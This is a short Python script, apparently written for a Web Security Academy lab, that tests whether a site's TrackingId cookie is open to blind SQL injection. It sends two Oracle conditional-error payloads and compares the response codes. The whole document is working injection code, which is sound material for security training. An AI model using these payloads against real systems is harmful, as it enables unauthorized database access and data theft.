import requests
from colorama import Fore,Style

url = "https://0a3b0003045eb721807d30f500320011.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories"
def requestor(payload):
    cookies = {'TrackingId':f"XN7CE9LY6cfHVJDv'{payload}"}
    requester = requests.get(url,cookies=cookies)
    return requester.status_code

query1 = " AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--"  
query2 = " AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--"  
if (requestor(query1) == 200 and requestor(query2)== 500):
    print(f"{Fore.RED}[+] cookie header is  sql injectable")
else:
    print(f"{Fore.BLUE}[-] cookie header is not vulnerble{Style.RESET_ALL}")